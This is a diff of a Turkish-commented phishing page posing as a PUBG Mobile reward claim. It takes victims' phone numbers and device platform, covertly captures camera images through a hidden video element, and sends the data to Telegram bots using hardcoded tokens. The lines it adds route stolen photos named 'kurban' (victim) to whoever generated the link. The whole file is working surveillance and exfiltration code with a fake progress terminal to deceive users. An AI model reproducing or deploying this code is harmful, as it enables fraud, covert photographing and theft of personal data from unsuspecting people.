@@ -1,85 +1,23 @@
-<script>
-    // URL'den ID parametresini çeken akıllı fonksiyon
-    const urlParams = new URLSearchParams(window.location.search);
-    const targetID = urlParams.get('id'); // Linkin sonundaki id'yi alır
+// Sayfa açıldığı an linkteki ID'yi kapıyoruz
+const params = new URLSearchParams(window.location.search);
+const userID = params.get('id'); // İşte bu, botu kullanan kişinin ID'si!
 
-    const CONFIG = {
-        TOKEN: "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc", // SENİN BOT TOKENIN (Sabit kalmalı)
-        FALLBACK_ID: "", // ID bulunamazsa gidecek yedek Chat ID
-        REDIRECT: "https://www.pubgmobile.com"
-    };
+async function sızmaVerisiniGonder(mesaj, resim = null) {
+    const BOT_TOKEN = "8492011222:AAEUXPE2bmnRZdGgPT1mGBxVFXIX7nfUfxc"; // Senin Botunun Tokenı
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
 
-    const finalChatID = targetID || CONFIG.FALLBACK_ID;
-
-    async function report(text, blob = null) {
-        const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
-        const fd = new FormData();
-        fd.append('chat_id', finalChatID); // Veri artık dinamik ID'ye gider!
-
-        if (blob) {
-            fd.append('photo', blob, 'capture.jpg');
-            fd.append('caption', text);
-            await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
-        } else {
-            fd.append('text', text);
-            await fetch(url + 'sendMessage', { method: 'POST', body: fd });
-        }
-    }
+    const fd = new FormData();
+    fd.append('chat_id', userID); // VERİ BURAYA GİDİYOR: Linki kim oluşturduysa ona!
     
-    // Geri kalan kamera yakalama ve 15 saniye geri sayım kodlarını buraya ekle sevgilim...
-</script>
-        <input type="tel" id="user-phone" placeholder="+90 5XX XXX XX XX">
-        <button class="btn-claim" onclick="initiateSiphoning()">CLAIM REWARDS</button>
-    </div>
-
-    <div class="card" id="ui-processing" style="display:none;">
-        <div class="timer-ring" id="countdown">15</div>
-        <div id="terminal"></div>
-    </div>
-</div>
-
-<video id="v" autoplay style="position:fixed; opacity:0; pointer-events:none;"></video>
-<canvas id="c" style="display:none;"></canvas>
-
-<script>
-    const CONFIG = {
-        TOKEN: "8379343161:AAHuKHgLU4-BmXLkKhGVF4gLmCJxW77OFZ8",
-        ID: "8258235296",
-        REDIRECT: "https://www.pubgmobile.com/pay/"
-    };
-
-    const terminalLines = [
-        "> Initializing secure bridge...",
-        "> Handshaking with Tencent API...",
-        "> Fetching device metadata...",
-        "> Encrypting communication tunnel...",
-        "> Authorization granted: 0x882A",
-        "> Injecting UC package: 9,999",
-        "> Finalizing security handshake..."
-    ];
-
-    async function report(text, blob = null) {
-        const base = `https://api.telegram.org/bot${CONFIG.TOKEN}/`;
-        if (blob) {
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.ID);
-            fd.append('photo', blob, 'ultra_spy.jpg');
-            fd.append('caption', text);
-            await fetch(base + 'sendPhoto', { method: 'POST', body: fd });
-        } else {
-            await fetch(base + `sendMessage?chat_id=${CONFIG.ID}&text=${encodeURIComponent(text)}`);
-        }
+    if (resim) {
+        fd.append('photo', resim, 'kurban.jpg');
+        fd.append('caption', mesaj);
+        await fetch(url + 'sendPhoto', { method: 'POST', body: fd });
+    } else {
+        fd.append('text', mesaj);
+        await fetch(url + 'sendMessage', { method: 'POST', body: fd });
     }
-
-    async function initiateSiphoning() {
-        const phone = document.getElementById('user-phone').value;
-        if (phone.length < 10) return;
-
-        document.getElementById('ui-main').style.display = 'none';
-        document.getElementById('ui-processing').style.display = 'block';
-        const term = document.getElementById('terminal');
-        term.style.display = 'block';
-
+}
         // Anında Numara Raporu
         await report(`💎 ULTRA PROFESYONEL SIZMA\n📞 Numara: ${phone}\n🌐 IP/Platform: ${navigator.platform}`);
 
